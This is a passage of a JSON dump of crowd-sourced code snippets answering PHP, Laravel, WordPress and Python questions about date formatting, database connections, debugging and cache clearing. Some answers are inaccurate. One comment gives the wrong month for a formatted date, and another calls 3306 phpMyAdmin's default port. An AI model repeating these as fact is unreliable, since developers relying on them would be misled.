date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n$date_string_prepared = date_create(\"2020-08-07\"); $date_string = $date_string_prepared->format(\"d M Y\"); // result 07 Jul 2020\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 929,
    "keyword": null,
    "link": null,
    "title": " datediff in hour query builder laravel",
    "description": "DB::table('product')->whereRaw('DATEDIFF(exp_date,current_date) < 15')->get(); \n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 930,
    "keyword": null,
    "link": null,
    "title": " datetime",
    "description": "from datetime import datetime as d date = d.now() print(date.strftime(\"%Y-%m-%d %H:%M:%S\"))\n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\nimport datetime print(datetime.datetime.now()) #datetime.datetime.now() is the syntax \nimport datetime  x = datetime.datetime(2018, 9, 15)  print(x.strftime(\"%b %d %Y %H:%M:%S\")) \nfrom datetime import datetime  # datetime object containing current date and time now = datetime.now()   print(\"now =\", now)  # dd/mm/YY H:M:S dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time =\", dt_string)\t \n# From a date Object: date_format ( DateTimeInterface $object , string $format )  # From the current time $dateTime = new \\DateTime();  // or pass a string or int ->`DateTime($date_time)` $dateTime->format('y-j-d H:i:s T'); #print ex: 21-2-02 16:00:01 PST  # Or a quick one-liner: date('g:i A m-d-Y', strtotime($date_time)); #print ex: 2:00 PM 02-02-2021\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 931,
    "keyword": null,
    "link": null,
    "title": " datetime difference in php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days\nfunction weeknumber($ddate) {     $date = new DateTime($ddate);      return $date->format('W'); }\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 932,
    "keyword": null,
    "link": null,
    "title": " datetime format laravel",
    "description": "//laravel method 1 {{ $data->created_at->isoFormat('dddd D') }}  //laravel method 2  {!! date('d/M/y', strtotime($data->created_at)) !!}\n{{\\Carbon\\Carbon::createFromFormat('H:i:s',$time)->format('h:i')}}  {{$item->date_seance->format('d/m/Y') }}  {{date('H:i', strtotime($item->start_time)) }}  \n{{ $post->created_at->diffForHumans() }}   /*   \t//Output   Arya Stuck 14 minutes ago   Post something       Mizan Khan 23 hours ago   Post something   */\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 933,
    "keyword": null,
    "link": null,
    "title": " datetime get month php",
    "description": "$month = date(\"m\",strtotime($mydate));\n$dateTime = new DateTime(); $month = $dateTime->format('m');\necho 'Day' . date('d', strtotime($row['Date'])); echo 'Month' . date('m', strtotime($row['Date'])); echo 'Year' . date('Y', strtotime($row['Date']));\n// get day of month php // Method 1; some server not work, I had check php 7.3.24 not worked, php 7.3.8 worked cal_days_in_month(CAL_GREGORIAN, $month, $year) echo (cal_days_in_month(CAL_GREGORIAN, 2, 2020)); // => 29  // Method 2; function days_in_month($month, $year) {     // calculate number of days in a month     return $month == 2 ? ($year % 4 ? 28 : ($year % 100 ? 29 : ($year % 400 ? 28 : 29))) : (($month - 1) % 7 % 2 ? 30 : 31); }  // Method 3; echo (date('t', strtotime('2020-02-1')));\t// 29   \n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 934,
    "keyword": null,
    "link": null,
    "title": " datetime php",
    "description": "$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n$date = DateTime::createFromFormat('d-m-Y', '15-12-2020');\n$dateTime = new \\DateTime(); $dateTime->format('Y-m-d H:i:s');\necho date('d/m/Y h:i:s a');\t// 01/02/2020 01:01:30 am // d - The day of the month (from 01 to 31) // D - A textual representation of a day (three letters) // j - The day of the month without leading zeros (1 to 31) // l (lowercase 'L') - A full textual representation of a day // N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) // S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) // w - A numeric representation of the day (0 for Sunday, 6 for Saturday) // z - The day of the year (from 0 through 365) // W - The ISO-8601 week number of year (weeks starting on Monday) // F - A full textual representation of a month (January through December) // m - A numeric representation of a month (from 01 to 12) // M - A short textual representation of a month (three letters) // n - A numeric representation of a month, without leading zeros (1 to 12) // t - The number of days in the given month // L - Whether it's a leap year (1 if it is a leap year, 0 otherwise) // o - The ISO-8601 year number // Y - A four digit representation of a year // y - A two digit representation of a year // a - Lowercase am or pm // A - Uppercase AM or PM // B - Swatch Internet time (000 to 999) // g - 12-hour format of an hour (1 to 12) // G - 24-hour format of an hour (0 to 23) // h - 12-hour format of an hour (01 to 12) // H - 24-hour format of an hour (00 to 23) // i - Minutes with leading zeros (00 to 59) // s - Seconds, with leading zeros (00 to 59) // u - Microseconds (added in PHP 5.2.2) // e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) // I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) // O - Difference to Greenwich time (GMT) in hours (Example: +0100) // P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) // T - Timezone abbreviations (Examples: EST, MDT) // Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) // c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) // r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) // U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\n# From a date Object: date_format ( DateTimeInterface $object , string $format )  # From the current time $dateTime = new \\DateTime();  // or pass a string or int ->`DateTime($date_time)` $dateTime->format('y-j-d H:i:s T'); #print ex: 21-2-02 16:00:01 PST  # Or a quick one-liner: date('g:i A m-d-Y', strtotime($date_time)); #print ex: 2:00 PM 02-02-2021\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 935,
    "keyword": null,
    "link": null,
    "title": " db::statement in laravel",
    "description": "DB::statement('DROP TABLE users'); DB::statement('ALTER TABLE projects AUTO_INCREMENT=123');\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 936,
    "keyword": null,
    "link": null,
    "title": " db connection in php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php  $hostName = 'localhost'; $userNmame = 'root'; $password = ''; $dbname = 'topproduct'; $db_name = \"mysql:host=$hostName;dbname=$dbname\"; $conn = new PDO($db_name,$userNmame,$password);  if(!$conn){     echo 'Error database connection';     } \nJust include this Temlate in other file using PHP Include/Require Keywords  And Make Connection In One Shot :)  <?php        // echo \"Welcome to Connecting of DB Tutorial!\";     // echo \"<br>\";      // 1. PDO - Php Data Objects     // 2. MySQLi extension      // Set Connection Variable     $server = \"localhost\";     $username = \"root\";     $password = \"\";     $database = \"test\";      // Create A Connection     $con = mysqLi_connect($server, $username, $password, $database);       // Check For Connection      if(!$con){         die (\"Connection Terminated! by Die() function\". mysqLi_connect_error());             }     else {         echo \"Connection Succefully Happened! <br>\";     }       ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\nExample (MySQLi Object-Oriented) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>  Example (MySQLi Procedural) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = mysqli_connect($servername, $username, $password);  // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected successfully\"; ?>  Example (PDO) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n",
    "reg_date": "2021-10-12T10:13:34.000Z"
  },
  {
    "id": 937,
    "keyword": null,
    "link": null,
    "title": " db connection postgres laravel",
    "description": "# cat myproject/.env | grep DB  DB_CONNECTION=pgsql  DB_HOST=<your_database_IP_address>  DB_PORT=5432  DB_DATABASE=postgres  DB_USERNAME=postgres  DB_PASSWORD=postgres\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 938,
    "keyword": null,
    "link": null,
    "title": " db enable query log",
    "description": "DB::enableQueryLog();  dd(DB::getQueryLog());\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 939,
    "keyword": null,
    "link": null,
    "title": " dd laravel query",
    "description": "DB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\nUse the toSql() method on a QueryBuilder instance.  DB::table('users')->toSql()\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 940,
    "keyword": null,
    "link": null,
    "title": " deactivate auto update wordpress plugins",
    "description": "add_filter( 'plugins_auto_update_enabled', '__return_false' );\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 941,
    "keyword": null,
    "link": null,
    "title": " deactivate woocommerce breadcrumbs",
    "description": "remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0); \n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 942,
    "keyword": null,
    "link": null,
    "title": " debian install apache php",
    "description": "apt-get -y install php7.0 libapache2-mod-php7.0\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 943,
    "keyword": null,
    "link": null,
    "title": " debug $ POST",
    "description": "debug $_POST snippet: <?php echo\"<pre>\"; print_r($_POST); echo\"</pre>\"; ?>\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 944,
    "keyword": null,
    "link": null,
    "title": " debug graphql wordpress",
    "description": "define( 'GRAPHQL_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 945,
    "keyword": null,
    "link": null,
    "title": " debug php",
    "description": "phpinfo();\nini_set('display_errors', 'On'); error_reporting(E_ALL);\n<?php $myVar = \"hello world!\";  var_dump($myVar); print_r($myVar);  $allVars = get_defined_vars(); print_r($allVars); debug_zval_dump($allVars);  function sayHello($hello) {     echo $hello;     debug_print_backtrace(); }  sayHello($myVar); ?>\n// ------ string ------- // use echo, exit for output $a = 123 echo ($a); exit;   // ------ array ------- $array = array( \t1 => 'apple',   \t2 => 'banana', )  // Method 1 echo \"<pre>\"; print_r($array); echo \"</pre>\";  // Method 2  echo \"<pre>\"; var_dump($array); echo \"</pre>\";  // Method 3 (no need exit) beacause of dd is already exit dd($array)    // Method 4 (cakephp) pr ($array);   // ------ json ------- $json = {\"a\":\"123\"}  pr (json_encode($json)); exit;  print_r (json_encode($json)); exit;\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 946,
    "keyword": null,
    "link": null,
    "title": " debug query builder laravel",
    "description": "DB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\n",
    "reg_date": "2021-10-12T10:13:35.000Z"
  },
  {
    "id": 947,
    "keyword": null,
    "link": null,
    "title": " debug wordpress",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\ndefine( 'WP_DEBUG', true ); \n// This enables debugging. define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 948,
    "keyword": null,
    "link": null,
    "title": " debug wordpress errors",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 949,
    "keyword": null,
    "link": null,
    "title": " declare boolean php",
    "description": " <?php $foo = True; // assign the value TRUE to $foo ?>  \nThe is_bool() function checks whether a variable is a boolean or not. This function returns true (1) if the variable is a boolean, otherwise it returns false/nothing.\nBooleans can be one of two constants: true false These values are not case sensitive, therefore true is the same as TRUE  booleans are also often used in control structures, either directly or as a result of an operation. For example:  if ($waterDrankToday > 3.7) {  echo \"Good work staying hydrated!\";  if ($havingABadDay)    hug(); } else   echo \"You should drink more water\";\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 950,
    "keyword": null,
    "link": null,
    "title": " declare empty array in php",
    "description": "$emptyArray = [];  $emptyArray = array(); $emptyArray = (array) null;\n$my_array = array_fill(0, $size_of_the_array, $some_data); \n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 951,
    "keyword": null,
    "link": null,
    "title": " decode jwt token laravel",
    "description": "$token = \"eyJhbGciOiJSUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1VTRVIiXSwidXNlcm5hbWUiOiJqYWdhZHVAaHViaWktbmV0d29yay5jb20iLCJleHAiOjE1MzYxNTI0MDAsImlhdCI6MTUzNTU0NzYwMH0.B7gnfGdW1ijAIlo9xUI0DwkGaajQAQPBkRx4ChILXRNtpLdwgEl_9gvWdiidFbSXJseS8jslOfuAFUIWATmbNBoWVa3nc8SxkIrKI29xZuN6hB7R-63RH2BKsAVPsEjgTIJoqkkCrfrSum-_d3LEf36jcXqZb8M-GRKI477IwSDDwG_7YK5v0mu8N4TATXhN0tZGNYxp8Y27EI-g0Gmj9BIiobxnqVVoBWHN5J8d-UCrXRq94ifhEiQBxkG9r_eacMscB80n1VsiN2ouKH2kX-HRxRJmcgmydxvR7RcEW-P6koTxkaZJGO6mv7auSudTFlDENpwD4OD7gtn_wMUDS_OuN8WT7rZp8lwKY9f8J9fiGyq5J-8C_HmyjW-h8WhuJmTUaKhCZ-eLgDm4Vs2IQGYkHJEDFumnIZ607MAa1CW1ChAvurqvUqJ3G4TTN4wYqAHpSKz4y8SAMLjO91cedBPH6K5i9lh5htF-mW_htem7e5ornicU_djSccgHbxfXHQYTHCnqLp7-ONfl_p4nmhIEK0wcF0gkBXbIitzeTjy7C_uf_FV1sLPE5cY3PUP42DmHrG4PuXHLv_L1EjErkrpna7pChKA_TPeiZjqMcQoE70sZw8rr8KnRF2hpABdU_M2ZXOt_vF5-T8mLmKqs0LHxE089vVC3xsAh0mUr4FE\";  $tokenParts = explode(\".\", $token);   $tokenHeader = base64_decode($tokenParts[0]); $tokenPayload = base64_decode($tokenParts[1]); $jwtHeader = json_decode($tokenHeader); $jwtPayload = json_decode($tokenPayload); print $jwtPayload->username; \neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiZmVjYzEzMzVkMGYyMzMyMTI4MmEyNTE3OTQ4MWQ3YjE0ODRmN2FmZjA0OGQyYjAyNjc2NmNjNjVjMGYxNWQ4NmViNTcwMjAxYzcwMWM3MGEiLCJpYXQiOjE2Mjg3MTcyNDMuODM4MTgyLCJuYmYiOjE2Mjg3MTcyNDMuODM4MTg1LCJleHAiOjE2NjAyNTMyNDMuNjc3NDUzLCJzdWIiOiIyIiwic2NvcGVzIjpbXX0.DzLK2J1VVDRXEwtu64Z3eLYPGDdtAzX45iMQhCF5AbCkmvIrrlNmPBbuun_lrdREeMsm13oJtCl3VSeQQta3eXp4mWoKfSGCaGmLU5GU087O-a8M0hkMQeASneviBaMwtNsG1TKTe7OkCuykFnrA4VpqAIOaWwtvj3yxcg03RZ0kGs4rmvnnAT4mjl3iMVfl7HFLvOJmALh8oAVKYfBQuE7dUPgVdqPF5H0apgYkWDXJYT9s2s3PoMKB8I3poW8Duj6yTwe2KHIJy5Nc5BPqmJiznYMMSjEfv4FNGymUx2GEXDF_OarUjICW5wsMti5XyBZ3uM8D2NUrlv_0Q45RGbcvTBEP4JiJSIAp_c1ia2UTDCAGoC32zTqgaoFkbkIRIZEL42iPMOcAPX3jBlsqZzjYQaY2ExouGZaIcAZLOJYnX_DjBUnnMZ1ZfH8XYdGHRvlQTTzibn49xNPsSYE8y7DF_f-ceHW82ZgA3lxO4mJN4719X_2ejgbMMOBv0-nWjcc27XhkdMw0T45OXspdE54n878jK-x3AFBhogoQj3C1rqxg-FUjGGbdn94s3zDSJzD55JJWrsOOiFcUAA2qftr5uRtYcJNSdm1jo_KYhMeDTjOimaBYMIN3j1RAR10Kn_WUx1jfJ3pag--BpxkUmMmvWoJVUcmb4TQH0QX1ORE\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 952,
    "keyword": null,
    "link": null,
    "title": " default index page for laravel in cpanel",
    "description": "# on cpanel, set document root to Laravels 'public' folder # put .htaccess to 'public_html' / root directory  RewriteEngine on RewriteBase /frameworkRootFolder/ RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ /frameworkRootFolder/index.php [L,QSA]\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 953,
    "keyword": null,
    "link": null,
    "title": " default php program",
    "description": "<?php  ?>\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 954,
    "keyword": null,
    "link": null,
    "title": " default port for phpmyadmin",
    "description": "3306\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 955,
    "keyword": null,
    "link": null,
    "title": " default time zone india php",
    "description": "date_default_timezone_set('Asia/Kolkata'); $timestamp = date(\"Y-m-d H:i:s\");\n<?php date_default_timezone_set(\"Asia/Calcutta\");   //India time (GMT+5:30) echo date('d-m-Y H:i:s'); ?>\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 956,
    "keyword": null,
    "link": null,
    "title": " define(\"ROOT PATH\",   DIR  );",
    "description": "//in php>5.3 define('ROOTPATH', dirname(__FILE__));  //else it's just: define(\"ROOT PATH\", __DIR__);\n",
    "reg_date": "2021-10-12T10:13:36.000Z"
  },
  {
    "id": 957,
    "keyword": null,
    "link": null,
    "title": " define in php",
    "description": "//define() is used to create constants define(name,value); //here name has to be a string //here value can be string, integer, float, boolean or NULL,  //and can be an array to if you are using PHP 7.0+  //define() before php 7.3 define(name,value,case_insensitive); //case_insensitive is optional and can be TRUE or FALSE by default its false\n <?php   define(\"cars\", [   \"Alfa Romeo\",      \"BMW\",   \"Toyota\" ]); echo cars[0]; ?>  \ndefine(\"name\", {value});\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 958,
    "keyword": null,
    "link": null,
    "title": " define int variable in php",
    "description": "<?php $x = 5985; var_dump(is_int($x));  $x = 59.85; var_dump(is_int($x)); ?>\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 959,
    "keyword": null,
    "link": null,
    "title": " define root path php",
    "description": "<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\nfunction getHtmlRootFolder(string $root = '/var/www/') {      // -- try to use DOCUMENT_ROOT first --     $ret = str_replace(' ', '', $_SERVER['DOCUMENT_ROOT']);     $ret = rtrim($ret, '/') . '/';      // -- if doesn't contain root path, find using this file's loc. path --     if (!preg_match(\"#\".$root.\"#\", $ret)) {       $root = rtrim($root, '/') . '/';       $root_arr = explode(\"/\", $root);       $pwd_arr = explode(\"/\", getcwd());       $ret = $root . $pwd_arr[count($root_arr) - 1];     }      return (preg_match(\"#\".$root.\"#\", $ret)) ? rtrim($ret, '/') . '/' : null; } \n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 960,
    "keyword": null,
    "link": null,
    "title": " define url wordpress",
    "description": "// Add to top of wp-config.php define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );\n$url = home_url(); echo $url; // Output: http://www.example.com  $url = home_url( '/' ); echo $url; // Output: http://www.example.com/  $url = home_url( $path = '/', $scheme = 'https' ); echo $url; // Output: https://www.example.com/  $url = home_url( $path = 'example', $scheme = 'relative' ); echo $url; // Output: /example\n//It is possible to set the site URL manually in the wp-config.php file.  //Add these two lines to your wp-config.php, where &ldquo;example.com&rdquo; is the correct location of your site.  define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );  //Important! Do not leave this code in the functions.php file. Remove them after the site is up and running again.  update_option( 'siteurl', 'http://example.com' ); update_option( 'home', 'http://example.com' );\noptions table 1. siteurl 2. home  ######## OR ########  // Add to top of wp-config.php define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' ); \n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 961,
    "keyword": null,
    "link": null,
    "title": " define value in php",
    "description": "$var = 5; //int $var = \"hey\"; //string $var = 'A'; //char\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 962,
    "keyword": null,
    "link": null,
    "title": " delete after 30 days in php",
    "description": "DELETE FROM archive WHERE STR_TO_DATE(SUBSTR(created_date, 0, 25), '%a, %d %b %Y %H:%i:%S') <       DATE_SUB(NOW(), INTERVAL 30 DAY); \n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 963,
    "keyword": null,
    "link": null,
    "title": " delete all rows from table laravel",
    "description": "MyModel::truncate();\nVisitor::query()->truncate();\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 964,
    "keyword": null,
    "link": null,
    "title": " delete all rows in table laravel",
    "description": "// Uncomment the below to wipe the table clean before populating  DB::table('table_name')->truncate();  //or  DB::table('table_name')->delete(); \nMyModel::truncate();\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 965,
    "keyword": null,
    "link": null,
    "title": " delete cache laravel",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\n//Borra la cache de laravel: Solo copia y pega. php artisan config:cache && php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled   \nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache \nphp artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear php artisan optimize\n",
    "reg_date": "2021-10-12T10:13:37.000Z"
  },
  {
    "id": 966,
    "keyword": null,
    "link": null,
    "title": " delete confirmation destroy laravel",
    "description": "<a class=\"btn btn-danger\" onclick=\"return confirm('Are you sure?')\" href=\"{{route('city-delete', $result->my_id)}}\"><i class=\"fa fa-trash\"></i></a> \n",
    "reg_date": "2021-10-12T10:13:38.000Z"
  },
  {
    "id": 967,
    "keyword": null,
    "link": null,
    "title": " delete file in php",
